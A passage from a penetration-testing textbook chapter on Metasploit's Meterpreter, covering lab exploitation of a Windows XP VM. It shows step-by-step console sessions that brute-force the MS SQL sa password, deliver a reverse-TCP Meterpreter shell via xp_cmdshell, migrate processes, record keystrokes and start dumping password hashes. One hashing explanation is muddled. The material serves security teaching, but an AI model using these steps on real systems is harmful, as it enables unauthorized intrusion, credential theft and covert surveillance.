<html><head></head><body><section epub:type="chapter" id="meterpreter"><div class="titlepage"><div class="book"><div class="book"><h2 class="title1">Chapter 6. Meterpreter</h2></div></div></div><p class="calibre2">In this chapter, we’ll dive deeper into this “hacker’s Swiss army knife” that can significantly improve your post exploitation experience. Meterpreter is one of the flagship products in Metasploit and is leveraged as a payload after a vulnerability is exploited. A <span class="strong"><em class="calibre4">payload</em></span> is the information returned to us when we trigger an exploit. For example, when we exploit a weakness in a Remote Procedure Call (RPC), trigger the exploit, and select Meterpreter as the payload, we would be given a Meterpreter shell to the system. Meterpreter is an extension of the Metasploit Framework that allows us to leverage Metasploit’s functionality and further compromise our target. Some of this functionality includes ways to cover your tracks, reside purely in memory, dump hashes, access operating systems, pivot, and much more.<a id="IDX-CHP-6-0001" class="strong"/><a id="IDX-CHP-6-0002" class="strong"/><a id="IDX-CHP-6-0003" class="strong"/></p><p class="calibre2">In this chapter, we’ll leverage normal attack methods within Metasploit to compromise a Windows XP machine. Our payload, Meterpreter, will allow us to perform additional attacks after we’ve compromised the system.</p><div class="book"><div class="titlepage"><div class="book"><div class="book"><h2 class="title2" id="compromising_a_windows_xp_virtual_machin">Compromising a Windows XP Virtual Machine</h2></div></div></div><p class="calibre2">Before we dive into the specifics of Meterpreter, we first need to compromise a system and get a Meterpreter shell.<a id="IDX-CHP-6-0004" class="strong"/><a id="IDX-CHP-6-0005" class="strong"/><a id="IDX-CHP-6-0006" class="strong"/><a id="IDX-CHP-6-0007" class="strong"/><a id="IDX-CHP-6-0008" class="strong"/><a id="IDX-CHP-6-0009" class="strong"/><a id="IDX-CHP-6-0010" class="strong"/><a id="IDX-CHP-6-0011" class="strong"/><a id="IDX-CHP-6-0012" class="strong"/><a id="IDX-CHP-6-0013" class="strong"/></p><div class="book"><div class="titlepage"><div class="book"><div class="book"><h3 class="title3" id="scanning_for_ports_with_nmap">Scanning for Ports with Nmap</h3></div></div></div><p class="calibre2">We begin by identifying the services and ports running on the target by conducting a port scan with <span class="strong"><em class="calibre4">nmap</em></span> to find a port to exploit, as shown here:</p><a id="I_programlisting6_d1e6375" class="strong"/><pre class="programlisting">msf &gt; <strong class="calibre3"><code class="calibre6">nmap -sT -A -P0 192.168.33.130</code></strong> <img src="../images/00002.gif" alt="" hisrc="httpatomoreillycomsourcenostarchimages867458.png" class="calibre7"/>
[*] exec: nmap -sT -A -P0 192.168.33.130

<strong class="calibre3"><code class="calibre6">. . . SNIP. . .</code></strong>

PORT     STATE SERVICE      VERSION
21/tcp   open  <strong class="calibre3"><code class="calibre6">ftp          Microsoft ftpd</code></strong> <img src="../images/00006.gif" alt="" hisrc="httpatomoreillycomsourcenostarchimages867466.png" class="calibre7"/>
25/tcp   open  <strong class="calibre3"><code class="calibre6">smtp         Microsoft ESMTP 6.0.2600.2180</code></strong> <img src="../images/00007.gif" alt="" hisrc="httpatomoreillycomsourcenostarchimages867468.png" class="calibre7"/>
80/tcp   open  <strong class="calibre3"><code class="calibre6">http         Microsoft IIS webserver 5.1</code></strong> <img src="../images/00026.gif" alt="" hisrc="httpatomoreillycomsourcenostarchimages867506.png" class="calibre7"/>
|_html-title: Directory Listing Denied
135/tcp  open  msrpc        Microsoft Windows RPC
139/tcp  open  netbios-ssn
445/tcp  open  microsoft-ds Microsoft Windows XP microsoft-ds
1025/tcp open  msrpc        Microsoft Windows RPC
1433/tcp open  <strong class="calibre3"><code class="calibre6">ms-sql-s     Microsoft SQL Server 2005 9.00.1399; RTM</code></strong> <img src="../images/00004.gif" alt="" hisrc="httpatomoreillycomsourcenostarchimages867462.png" class="calibre7"/>
6646/tcp open  unknown
MAC Address: 00:0C:29:EA:26:7C (VMware)
Device type: general purpose
Running: Microsoft Windows XP|2003
OS details: Microsoft Windows XP Professional SP2 <img src="../images/00005.gif" alt="" hisrc="httpatomoreillycomsourcenostarchimages867464.png" class="calibre7"/> or Windows Server 2003

<strong class="calibre3"><code class="calibre6">. . . SNIP . . .</code></strong>

Nmap done: 1 IP address (1 host up) scanned in 37.58 seconds

msf &gt;</pre><p class="calibre2">After conducting our port scan at <span class="inlinemediaobject"><a id="I_inlinemediaobject6_d1e6438" class="strong"/><img src="../images/00002.gif" alt="" hisrc="httpatomoreillycomsourcenostarchimages867458.png" class="calibre8"/></span>, we see that some interesting ports are accessible, including MS SQL at <span class="inlinemediaobject"><a id="I_inlinemediaobject6_d1e6444" class="strong"/><img src="../images/00004.gif" alt="" hisrc="httpatomoreillycomsourcenostarchimages867462.png" class="calibre8"/></span>, a potential attack vector. But perhaps the most interesting thing that <span class="strong"><em class="calibre4">nmap</em></span> tells us is that this machine is running Windows XP Service Pack 2 at<span class="inlinemediaobject"><a id="I_inlinemediaobject6_d1e6453" class="strong"/><img src="../images/00005.gif" alt="" hisrc="httpatomoreillycomsourcenostarchimages867464.png" class="calibre8"/></span>, which is now at the end of life, which means some published vulnerabilities will not have been fixed or patched by the installation of SP3.</p><p class="calibre2">Also of note, we see the standard FTP <span class="inlinemediaobject"><a id="I_inlinemediaobject6_d1e6461" class="strong"/><img src="../images/00006.gif" alt="" hisrc="httpatomoreillycomsourcenostarchimages867466.png" class="calibre8"/></span> and SMTP <span class="inlinemediaobject"><a id="I_inlinemediaobject6_d1e6467" class="strong"/><img src="../images/00007.gif" alt="" hisrc="httpatomoreillycomsourcenostarchimages867468.png" class="calibre8"/></span> ports, which might be available to be leveraged for an attack. And we see that port 80 <span class="inlinemediaobject"><a id="I_inlinemediaobject6_d1e6473" class="strong"/><img src="../images/00026.gif" alt="" hisrc="httpatomoreillycomsourcenostarchimages867506.png" class="calibre8"/></span> is open, which means we have a potential web application to attack.</p></div><div class="book"><div class="titlepage"><div class="book"><div class="book"><h3 class="title3" id="attacking_ms_sql">Attacking MS SQL</h3></div></div></div><p class="calibre2">In this example, we’ll attack port 1433, MS SQL, because this is often an entry point of weakness that can lead to a complete compromise and full administrative-level control over the target.<a id="IDX-CHP-6-0014" class="strong"/></p><p class="calibre2">To begin, we identify the MS SQL installation, and then launch a MS SQL Server brute force attack to see if we can guess a password. By default, MS SQL is installed on TCP port 1433 and UDP port 1434, though newer versions allow for installation on a dynamically allocated port, which can be randomized. Luckily, port 1434 UDP (for which we did not scan) remains the same and can be queried to identify the dynamic port of the SQL server.<a id="IDX-CHP-6-0015" class="strong"/><a id="IDX-CHP-6-0016" class="strong"/><a id="IDX-CHP-6-0017" class="strong"/></p><p class="calibre2">Here, we scan the system and see that MS SQL port 1434 UDP is open:</p><a id="I_programlisting6_d1e6504" class="strong"/><pre class="programlisting">msf &gt; <strong class="calibre3"><code class="calibre6">nmap -sU 192.168.33.130 -p1434</code></strong> <img src="../images/00002.gif" alt="" hisrc="httpatomoreillycomsourcenostarchimages867458.png" class="calibre7"/>

Nmap scan report for 192.168.33.130
Host is up (0.00033s latency).
PORT     STATE         SERVICE
1434/udp open         ms-sql-m <img src="../images/00004.gif" alt="" hisrc="httpatomoreillycomsourcenostarchimages867462.png" class="calibre7"/>

Nmap done: 1 IP address (1 host up) scanned in 0.46 seconds
msf &gt;</pre><p class="calibre2">As you can see, we scan our host at <span class="inlinemediaobject"><a id="I_inlinemediaobject6_d1e6523" class="strong"/><img src="../images/00002.gif" alt="" hisrc="httpatomoreillycomsourcenostarchimages867458.png" class="calibre8"/></span> and see that MS SQL UDP port 1434 at <span class="inlinemediaobject"><a id="I_inlinemediaobject6_d1e6529" class="strong"/><img src="../images/00004.gif" alt="" hisrc="httpatomoreillycomsourcenostarchimages867462.png" class="calibre8"/></span> is open. (<a class="xref" href="part0015.html#fast-track">Chapter 11</a>, <a class="xref" href="part0017.html#building_your_own_module">Chapter 13</a>, and <a class="xref" href="part0021.html#simulated_penetration_test">Chapter 17</a> will cover MS SQL in much more depth.)</p><p class="calibre2">When targeting MS SQL, we can leverage the <span class="strong"><em class="calibre4">mssql_ping</em></span> module to brute force the MS SQL port and attempt to guess the username and password. When MS SQL is first installed, the program will require the user to create an <span class="strong"><em class="calibre4">sa</em></span>, or system administrator, account. You’ll often be able to guess or brute force the <span class="strong"><em class="calibre4">sa</em></span> account password, because when administrators install this application they do not understand the security ramifications of using either a blank password or something too simple.</p><p class="calibre2">In the next example, we look for the <span class="strong"><em class="calibre4">mssql_ping</em></span> module and attempt to brute force the <span class="strong"><em class="calibre4">sa</em></span> account:</p><a id="I_programlisting6_d1e6560" class="strong"/><pre class="programlisting">msf &gt; <strong class="calibre3"><code class="calibre6">use scanner/mssql/mssql_ping</code></strong>
msf auxiliary(mssql_ping) &gt; <strong class="calibre3"><code class="calibre6">show options</code></strong>

Module options:

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   PASSWORD                   no        The password for the specified username
   RHOSTS                     yes       The target address range or CIDR identifier
   THREADS   1                yes       The number of concurrent threads
   USERNAME  sa               no        The username to authenticate as

msf auxiliary(mssql_ping) &gt; <strong class="calibre3"><code class="calibre6">set RHOSTS 192.168.33.1/24</code></strong>
RHOSTS =&gt; 192.168.33.1/24
msf auxiliary(mssql_ping) &gt; <strong class="calibre3"><code class="calibre6">set THREADS 20</code></strong>
THREADS =&gt; 20
msf auxiliary(mssql_ping) &gt; <strong class="calibre3"><code class="calibre6">exploit</code></strong>

[*] Scanned 040 of 256 hosts (015% complete)
[*] Scanned 052 of 256 hosts (020% complete)
[*] Scanned 080 of 256 hosts (031% complete)
[*] Scanned 115 of 256 hosts (044% complete)
[*] SQL Server information for 192.168.33.130: <img src="../images/00002.gif" alt="" hisrc="httpatomoreillycomsourcenostarchimages867458.png" class="calibre7"/>
[*]    ServerName      = IHAZSECURITY <img src="../images/00004.gif" alt="" hisrc="httpatomoreillycomsourcenostarchimages867462.png" class="calibre7"/>
[*]    InstanceName    = SQLEXPRESS
[*]    IsClustered     = No
[*]    Version         = 9.00.1399.06 <img src="../images/00005.gif" alt="" hisrc="httpatomoreillycomsourcenostarchimages867464.png" class="calibre7"/>
[*]    tcp             = 1433 <img src="../images/00006.gif" alt="" hisrc="httpatomoreillycomsourcenostarchimages867466.png" class="calibre7"/>
[*]    np              = \\IHAZSECURITY\pipe\MSSQL$SQLEXPRESS\sql\query
[*] Scanned 129 of 256 hosts (050% complete)</pre><p class="calibre2">After calling the <span class="strong"><em class="calibre4">mssql_ping</em></span> module with <code class="literal">use scanner/mssql/mssql_ping</code> and setting our options, we see that a SQL Server installation is found at 192.168.33.130 <span class="inlinemediaobject"><a id="I_inlinemediaobject6_d1e6610" class="strong"/><img src="../images/00002.gif" alt="" hisrc="httpatomoreillycomsourcenostarchimages867458.png" class="calibre8"/></span>. The name of the server is <code class="literal">IHAZSECURITY</code> <span class="inlinemediaobject"><a id="I_inlinemediaobject6_d1e6619" class="strong"/><img src="../images/00004.gif" alt="" hisrc="httpatomoreillycomsourcenostarchimages867462.png" class="calibre8"/></span>. Its version number 9.00.1399.06 shown at <span class="inlinemediaobject"><a id="I_inlinemediaobject6_d1e6626" class="strong"/><img src="../images/00005.gif" alt="" hisrc="httpatomoreillycomsourcenostarchimages867464.png" class="calibre8"/></span> equates to SQL Server 2005 Express, and we know that it’s listening on TCP port 1433 <span class="inlinemediaobject"><a id="I_inlinemediaobject6_d1e6632" class="strong"/><img src="../images/00006.gif" alt="" hisrc="httpatomoreillycomsourcenostarchimages867466.png" class="calibre8"/></span>.<a id="IDX-CHP-6-0018" class="strong"/><a id="IDX-CHP-6-0019" class="strong"/><a id="IDX-CHP-6-0020" class="strong"/><a id="IDX-CHP-6-0021" class="strong"/><a id="IDX-CHP-6-0022" class="strong"/></p></div><div class="book"><div class="titlepage"><div class="book"><div class="book"><h3 class="title3" id="brute_forcing_ms_sql_server">Brute Forcing MS SQL Server</h3></div></div></div><p class="calibre2">Next, we brute force the server with the Framework’s <span class="strong"><em class="calibre4">mssql_login</em></span> module:</p><a id="I_programlisting6_d1e6669" class="strong"/><pre class="programlisting">msf &gt; <strong class="calibre3"><code class="calibre6">use scanner/mssql/mssql_login</code></strong> <img src="../images/00002.gif" alt="" hisrc="httpatomoreillycomsourcenostarchimages867458.png" class="calibre7"/>
msf auxiliary(mssql_login) &gt; <strong class="calibre3"><code class="calibre6">show options</code></strong>

Module options:

   Name              Current Setting  Required  Description
   ----              ---------------  --------  -----------
   BRUTEFORCE_SPEED  5                yes       How fast to bruteforce, from 0 to 5
   PASSWORD                           no
        The password for the specified username
   PASS_FILE                          no
        File containing passwords, one per line
   RHOSTS                             yes       The target
 address range or CIDR identifier
   RPORT             1433             yes       The target port
   THREADS           1                yes       The number of concurrent threads
   USERNAME          sa               no        The username to authenticate as
   USERPASS_FILE                      no        File containing users and passwords
                                                  separated by
 space, one pair per line
   USER_FILE                          no        File containing
 usernames, one per line
   VERBOSE           true             yes       Whether to print
 output for all attempts

msf auxiliary(mssql_login) &gt;
 <strong class="calibre3"><code class="calibre6">set PASS_FILE /pentest/exploits/fasttrack/bin/dict/wordlist.txt</code></strong> <img src="../images/00004.gif" alt="" hisrc="httpatomoreillycomsourcenostarchimages867462.png" class="calibre7"/>
PASS_FILE =&gt; /pentest/exploits/fasttrack/bin/dict/wordlist.txt
msf auxiliary(mssql_login) &gt; <strong class="calibre3"><code class="calibre6">set RHOSTS 192.168.33.130</code></strong>
RHOSTS =&gt; 192.168.33.130
msf auxiliary(mssql_login) &gt; <strong class="calibre3"><code class="calibre6">set THREADS 10</code></strong>
THREADS =&gt; 10
msf auxiliary(mssql_login) &gt; <strong class="calibre3"><code class="calibre6">set verbose false</code></strong>
verbose =&gt; false
msf auxiliary(mssql_login) &gt; <strong class="calibre3"><code class="calibre6">exploit</code></strong>
[+] 192.168.33.130:1433 - MSSQL - successful login 'sa' : <strong class="calibre3"><code class="calibre6">'password123'</code></strong> <img src="../images/00005.gif" alt="" hisrc="httpatomoreillycomsourcenostarchimages867464.png" class="calibre7"/>
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed</pre><p class="calibre2">We select the <span class="strong"><em class="calibre4">mssql_login</em></span> module at <span class="inlinemediaobject"><a id="I_inlinemediaobject6_d1e6719" class="strong"/><img src="../images/00002.gif" alt="" hisrc="httpatomoreillycomsourcenostarchimages867458.png" class="calibre8"/></span> and point it to the default password word list from Fast-Track at <span class="inlinemediaobject"><a id="I_inlinemediaobject6_d1e6725" class="strong"/><img src="../images/00004.gif" alt="" hisrc="httpatomoreillycomsourcenostarchimages867462.png" class="calibre8"/></span>. (We discuss Fast-Track in more detail in <a class="xref" href="part0015.html#fast-track">Chapter 11</a>.) At <span class="inlinemediaobject"><a id="I_inlinemediaobject6_d1e6733" class="strong"/><img src="../images/00005.gif" alt="" hisrc="httpatomoreillycomsourcenostarchimages867464.png" class="calibre8"/></span>, we have successfully guessed the <span class="strong"><em class="calibre4">sa</em></span> password: <span class="strong"><em class="calibre4">password123</em></span>.<a id="IDX-CHP-6-0023" class="strong"/><a id="IDX-CHP-6-0024" class="strong"/><a id="IDX-CHP-6-0025" class="strong"/><a id="IDX-CHP-6-0026" class="strong"/><a id="IDX-CHP-6-0027" class="strong"/><a id="IDX-CHP-6-0028" class="strong"/></p><div class="book"><hr class="calibre5"/></div><div class="note"><h3 class="title4">Note</h3><p class="calibre2">Fast-Track is a tool created by one of the authors of this book that leverages multiple attacks, exploits, and the Metasploit Framework for payload delivery. One of Fast-Track’s features is its ability to use a brute-forcer to attack and compromise MS SQL automatically.</p></div><div class="book"><hr class="calibre5"/></div></div><div class="book"><div class="titlepage"><div class="book"><div class="book"><h3 class="title3" id="the_xp_underscore_cmdshell">The xp_cmdshell</h3></div></div></div><p class="calibre2">By running MS SQL from the <span class="strong"><em class="calibre4">sa</em></span> account, we can execute the stored procedure <code class="literal">xp_cmdshell</code>, which lets us interact with the underlying operating system and execute commands. The <code class="literal">xp_cmdshell</code> is a built-in stored procedure that ships by default with SQL Server. You can call this stored procedure and have it query and execute underlying operating system calls directly with MS SQL. Think of it as a kind of superuser command prompt that allows you to run anything you want on the operating system. When we gain access to the <span class="strong"><em class="calibre4">sa</em></span> account, we find that the MS SQL server is generally running with SYSTEM-level permissions, which allows us full access as an administrator to both MS SQL and the machine itself.<a id="IDX-CHP-6-0029" class="strong"/><a id="IDX-CHP-6-0030" class="strong"/><a id="IDX-CHP-6-0031" class="strong"/></p><p class="calibre2">To get a payload onto the system, we’ll interact with the <code class="literal">xp_cmdshell</code>, add a local administrator, and deliver the payload through an executable. David Kennedy and Joshua Drake (<span class="strong"><em class="calibre4">jduck</em></span>), have written a module (<span class="strong"><em class="calibre4">mssql_payload</em></span>) that can be used to deliver any Metasploit payload through <code class="literal">xp_cmdshell</code>:<a id="IDX-CHP-6-0032" class="strong"/></p><a id="I_programlisting6_d1e6819" class="strong"/><pre class="programlisting">msf &gt; <strong class="calibre3"><code class="calibre6">use windows/mssql/mssql_payload</code></strong> <img src="../images/00002.gif" alt="" hisrc="httpatomoreillycomsourcenostarchimages867458.png" class="calibre7"/>
msf exploit(mssql_payload) &gt; <strong class="calibre3"><code class="calibre6">show options</code></strong>

Module options:

   Name          Current Setting  Required  Description
   ----          ---------------  --------  -----------
   PASSWORD                       no        The password for the specified username
   RHOST                          yes       The target address
   RPORT         1433             yes       The target port
   USERNAME      sa               no        The username to authenticate as
   UseCmdStager  true             no        Wait for user input before
 returning from exploit
   VERBOSE       false            no        Enable verbose output


Exploit target:

   Id  Name
   --  ----
   0   Automatic
msf exploit(mssql_payload) &gt; <strong class="calibre3"><code class="calibre6">set payload windows/meterpreter/reverse_tcp</code></strong> <img src="../images/00004.gif" alt="" hisrc="httpatomoreillycomsourcenostarchimages867462.png" class="calibre7"/>
payload =&gt; windows/meterpreter/reverse_tcp
msf exploit(mssql_payload) &gt; <strong class="calibre3"><code class="calibre6">set LHOST 192.168.33.129</code></strong>
LHOST =&gt; 192.168.33.129
msf exploit(mssql_payload) &gt; <strong class="calibre3"><code class="calibre6">set LPORT 443</code></strong>
LPORT =&gt; 443
msf exploit(mssql_payload) &gt; <strong class="calibre3"><code class="calibre6">set RHOST 192.168.33.130</code></strong>
RHOST =&gt; 192.168.33.130
msf exploit(mssql_payload) &gt; <strong class="calibre3"><code class="calibre6">set PASSWORD password123</code></strong>
PASSWORD =&gt; password123
msf exploit(mssql_payload) &gt; <strong class="calibre3"><code class="calibre6">exploit</code></strong>

[*] Started reverse handler on 192.168.33.129:443
[*] Command Stager progress - 2.78% done (1494/53679 bytes)
[*] Command Stager progress - 5.57% done (2988/53679 bytes)
[*] Command Stager progress - 8.35% done (4482/53679 bytes)

<strong class="calibre3"><code class="calibre6">. . . SNIP . . .</code></strong>

[*] Command Stager progress - 97.32% done (52239/53679 bytes)
[*] Sending stage (748032 bytes)
[*] Meterpreter session 1 opened (192.168.33.129:443 -&gt; 192.168.33.130:1699)
meterpreter &gt; <img src="../images/00005.gif" alt="" hisrc="httpatomoreillycomsourcenostarchimages867464.png" class="calibre7"/></pre><p class="calibre2">After selecting the <span class="strong"><em class="calibre4">mssql_payload</em></span> module and setting our payload to <code class="literal">meterpreter</code> at <span class="inlinemediaobject"><a id="I_inlinemediaobject6_d1e6875" class="strong"/><img src="../images/00004.gif" alt="" hisrc="httpatomoreillycomsourcenostarchimages867462.png" class="calibre8"/></span>, all we need to do is set the standard options before starting our Meterpreter session. We’ve succeeded in opening a Meterpreter session at <span class="inlinemediaobject"><a id="I_inlinemediaobject6_d1e6881" class="strong"/><img src="../images/00005.gif" alt="" hisrc="httpatomoreillycomsourcenostarchimages867464.png" class="calibre8"/></span> on the target machine.<a id="IDX-CHP-6-0033" class="strong"/><a id="IDX-CHP-6-0034" class="strong"/><a id="IDX-CHP-6-0035" class="strong"/><a id="IDX-CHP-6-0036" class="strong"/><a id="IDX-CHP-6-0037" class="strong"/><a id="IDX-CHP-6-0038" class="strong"/><a id="IDX-CHP-6-0039" class="strong"/><a id="IDX-CHP-6-0040" class="strong"/></p><p class="calibre2">To recap, in the attack described here, we used the <span class="strong"><em class="calibre4">mssql_ping</em></span> module to guess the MS SQL <span class="strong"><em class="calibre4">sa</em></span> password, which we discovered is <span class="strong"><em class="calibre4">password123</em></span>. We then leveraged the <span class="strong"><em class="calibre4">mssql_payload</em></span> module to communicate with MS SQL and upload a Meterpreter shell through MS SQL, and the shell was presented to us, thereby completely compromising the system. Once the Meterpreter shell is presented, we know that the exploit was successful and we can continue with post exploitation on this system.</p></div><div class="book"><div class="titlepage"><div class="book"><div class="book"><h3 class="title3" id="basic_meterpreter_commands">Basic Meterpreter Commands</h3></div></div></div><p class="calibre2">Having successfully compromised the target and gained a Meterpreter console on the system, we can glean more information with some basic Meterpreter commands. Use the <code class="literal">help</code> command at any point for more information on how to use Meterpreter.<a id="IDX-CHP-6-0041" class="strong"/></p><div class="sect"><div class="titlepage"><div class="book"><div class="book"><h4 class="title5" id="capturing_a_screenshot">Capturing a Screenshot</h4></div></div></div><p class="calibre2">Meterpreter’s <code class="literal">screenshot</code> command will export an image of the active user’s desktop and save it to the <span class="strong"><em class="calibre4">/opt/metasploit3/msf3/</em></span> directory, as shown in <a class="xref" href="part0010.html#meterpreter-captured_screenshot">Figure 6-1</a>.</p><a id="I_programlisting6_d1e6962" class="strong"/><pre class="programlisting">meterpreter &gt; <strong class="calibre3"><code class="calibre6">screenshot</code></strong>
Screenshot saved to: /opt/metasploit3/msf3/yVHXaZar.jpeg</pre><p class="calibre2">Desktop screen captures offer a great way to learn about a target system. For example, in <a class="xref" href="part0010.html#meterpreter-captured_screenshot">Figure 6-1</a>, we can see that McAfee antivirus software is installed and running, which means we’ll need to be cautious about what we upload to the system. (<a class="xref" href="part0011.html#avoiding_detection">Chapter 7</a> discusses antivirus evasion in more detail.)<a id="IDX-CHP-6-0042" class="strong"/><a id="IDX-CHP-6-0043" class="strong"/><a id="IDX-CHP-6-0044" class="strong"/><a id="IDX-CHP-6-0045" class="strong"/><a id="IDX-CHP-6-0046" class="strong"/><a id="IDX-CHP-6-0047" class="strong"/></p><div class="figure"><a id="meterpreter-captured_screenshot" class="strong"/><div class="book"><div class="book"><a id="I_mediaobject6_d1e7006" class="strong"/><img src="../images/00030.jpeg" alt="Meterpreter-captured screenshot" hisrc="httpatomoreillycomsourcenostarchimages867514.png.jpg" class="calibre7"/></div></div><div class="figure-title">Figure 6-1. Meterpreter-captured screenshot</div></div></div><div class="sect"><div class="titlepage"><div class="book"><div class="book"><h4 class="title5" id="sysinfo">sysinfo</h4></div></div></div><p class="calibre2">Another command we can specify is <code class="literal">sysinfo</code>, which will tell us the platform on which the system is running, as shown here:</p><a id="I_programlisting6_d1e7019" class="strong"/><pre class="programlisting">meterpreter &gt; <strong class="calibre3"><code class="calibre6">sysinfo</code></strong>
Computer: IHAZSECURITY
OS      : Windows XP (Build 2600, Service Pack 2).
Arch    : x86
Language: en_US</pre><p class="calibre2">As you can see, this system is running Windows XP Service Pack 2. Because SP2 is end of life, we can assume that we can find a ton of holes on this system.</p></div></div><div class="book"><div class="titlepage"><div class="book"><div class="book"><h3 class="title3" id="capturing_keystrokes">Capturing Keystrokes</h3></div></div></div><p class="calibre2">Now we’ll grab the password hash values from this system, which can either be cracked or used in an attack. We’ll also start <span class="strong"><em class="calibre4">keystroke logging</em></span> (recording keystrokes) on the remote system. But first, let’s list the running processes on the target system with the <code class="literal">ps</code> command.<a id="IDX-CHP-6-0048" class="strong"/></p><a id="I_programlisting6_d1e7044" class="strong"/><pre class="programlisting">meterpreter &gt; <strong class="calibre3"><code class="calibre6">ps</code></strong> <img src="../images/00002.gif" alt="" hisrc="httpatomoreillycomsourcenostarchimages867458.png" class="calibre7"/>

Process list
============

 PID   Name                 Arch  Session  User                          Path
 ---   ----                 ----  -------  ----                          ----
 0     [System Process]
 4     System               x86   0        NT AUTHORITY\SYSTEM

<strong class="calibre3"><code class="calibre6">. . . SNIP . . .</code></strong>

 1476  spoolsv.exe          x86    0        NT AUTHORITY\SYSTEM           C:\WINDOWS\
    system32\spoolsv.exe
 1668  explorer.exe <img src="../images/00004.gif" alt="" hisrc="httpatomoreillycomsourcenostarchimages867462.png" class="calibre7"/>
       x86    0        IHAZSECURITY\Administrator    C:\WINDOWS\
    Explorer.EXE

<strong class="calibre3"><code class="calibre6">. . . SNIP . . .</code></strong>

 4032  notepad.exe         x86    0        IHAZSECURITY\Administrator    C:\WINDOWS\
    system32\notepad.exe

meterpreter &gt; <strong class="calibre3"><code class="calibre6">migrate 1668</code></strong> <img src="../images/00005.gif" alt="" hisrc="httpatomoreillycomsourcenostarchimages867464.png" class="calibre7"/>
[*] Migrating to 1668...
[*] Migration completed successfully.
meterpreter &gt; <strong class="calibre3"><code class="calibre6">run post/windows/capture/keylog_recorder</code></strong> <img src="../images/00006.gif" alt="" hisrc="httpatomoreillycomsourcenostarchimages867466.png" class="calibre7"/>
[*] Executing module against V-MAC-XP
[*] Starting the keystroke sniffer...
[*] Keystrokes being saved in to /root/.msf3/loot/
20110324171334_default_192.168.1.195_host.windows.key_179703.txt
[*] Recording keystrokes...
[*] Saving last few keystrokes...

root@bt:˜# <strong class="calibre3"><code class="calibre6">cat /root/.msf3/loot/20110324171334_</code></strong>
<strong class="calibre3"><code class="calibre6">default_192.168.1.195_host.windows.key_179703.txt</code></strong> <img src="../images/00007.gif" alt="" hisrc="httpatomoreillycomsourcenostarchimages867468.png" class="calibre7"/>
Keystroke log started at Thu Mar 24 17:13:34 −0600 2011

administrator password &lt;Back&gt;  &lt;Back&gt;  &lt;Back&gt;  &lt;Back&gt;  &lt;Back&gt;  &lt;Back&gt;
  &lt;Back&gt;  &lt;Tab&gt; password123!!</pre><p class="calibre2">Executing <code class="literal">ps</code> at <span class="inlinemediaobject"><a id="I_inlinemediaobject6_d1e7104" class="strong"/><img src="../images/00002.gif" alt="" hisrc="httpatomoreillycomsourcenostarchimages867458.png" class="calibre8"/></span> provides a list of running processes, including <span class="strong"><em class="calibre4">explorer.exe</em></span> <span class="inlinemediaobject"><a id="I_inlinemediaobject6_d1e7113" class="strong"/><img src="../images/00004.gif" alt="" hisrc="httpatomoreillycomsourcenostarchimages867462.png" class="calibre8"/></span>. At <span class="inlinemediaobject"><a id="I_inlinemediaobject6_d1e7119" class="strong"/><img src="../images/00005.gif" alt="" hisrc="httpatomoreillycomsourcenostarchimages867464.png" class="calibre8"/></span> we issue the <code class="literal">migrate</code> command to move our session into the <span class="strong"><em class="calibre4">explorer.exe</em></span> process space. Once that move is complete, we start the <span class="strong"><em class="calibre4">keylog_recorder</em></span> module at <span class="inlinemediaobject"><a id="I_inlinemediaobject6_d1e7135" class="strong"/><img src="../images/00006.gif" alt="" hisrc="httpatomoreillycomsourcenostarchimages867466.png" class="calibre8"/></span>, stopping it after some time with <span class="keycap">ctrl</span>-C, and finally, at <span class="inlinemediaobject"><a id="I_inlinemediaobject6_d1e7144" class="strong"/><img src="../images/00007.gif" alt="" hisrc="httpatomoreillycomsourcenostarchimages867468.png" class="calibre8"/></span>, in another terminal window, we dump the contents of the keystroke logger to see what we’ve caught.<a id="IDX-CHP-6-0049" class="strong"/><a id="IDX-CHP-6-0050" class="strong"/><a id="IDX-CHP-6-0051" class="strong"/><a id="IDX-CHP-6-0052" class="strong"/><a id="IDX-CHP-6-0053" class="strong"/><a id="IDX-CHP-6-0054" class="strong"/><a id="IDX-CHP-6-0055" class="strong"/><a id="IDX-CHP-6-0056" class="strong"/><a id="IDX-CHP-6-0057" class="strong"/><a id="IDX-CHP-6-0058" class="strong"/><a id="IDX-CHP-6-0059" class="strong"/><a id="IDX-CHP-6-0060" class="strong"/></p></div></div><div class="book"><div class="titlepage"><div class="book"><div class="book"><h2 class="title2" id="dumping_usernames_and_passwords">Dumping Usernames and Passwords</h2></div></div></div><p class="calibre2">In the preceding example, we grabbed password hashes by logging what a user typed. We can also use Meterpreter to obtain the usernames and password hashes on a local file system without the use of keyloggers.<a id="IDX-CHP-6-0061" class="strong"/></p><div class="book"><div class="titlepage"><div class="book"><div class="book"><h3 class="title3" id="extracting_the_password_hashes">Extracting the Password Hashes</h3></div></div></div><p class="calibre2">In this attack, we’ll leverage the <span class="strong"><em class="calibre4">hashdump</em></span> post exploitation module in Meterpreter to extract the username and password hashes from the system. Microsoft typically stores hashes on LAN Manager (LM), NT LAN Manager (NTLM), and NT LAN Manager v2 (NTLMv2).</p><p class="calibre2">In the case of LM, for example, when a use enters a password for the first time or changes a password, the password is assigned a hash value. Depending on the hash value length, the password can be split into seven-character hashes. For example, if the password is <span class="strong"><em class="calibre4">password123456</em></span>, the hash value could be stored as <span class="strong"><em class="calibre4">passwor</em></span> and <span class="strong"><em class="calibre4">d123456</em></span>, so an attacker would simply need to crack a 7-character password instead of a 14-character one. In NTLM, regardless of the password size, <span class="strong"><em class="calibre4">password123456</em></span> would be stored as a hash value of <span class="strong"><em class="calibre4">password123456</em></span>.<a id="IDX-CHP-6-0062" class="strong"/><a id="IDX-CHP-6-0063" class="strong"/><a id="IDX-CHP-6-0064" class="strong"/><a id="IDX-CHP-6-0065" class="strong"/><a id="IDX-CHP-6-0066" class="strong"/><a id="IDX-CHP-6-0067" class="strong"/><a id="IDX-CHP-6-0068" class="strong"/><a id="IDX-CHP-6-0069" class="strong"/></p><div class="book"><hr class="calibre5"/></div><div class="note"><h3 class="title4">Note</h3><p class="calibre2">We’re using a super complex password here that we would not be able to crack in a reasonable amount of time. Our password is larger than the 14-character maximum that LM supports, so it has automatically converted itself to an NTLM-based hash value. Even with rainbow tables or a super powerful cracking machine, it would take a significant amount of time to crack these passwords.</p></div><div class="book"><hr class="calibre5"/></div><p class="calibre2">In the following code, we extract a username and password hash for the <span class="strong"><em class="calibre4">Administrator</em></span> user account with UID 500 (the Windows Administrator system default). The strings that follow <code class="literal">Administrator:500</code> are two hashes of the <span class="strong"><em class="calibre4">Administrator</em></span> 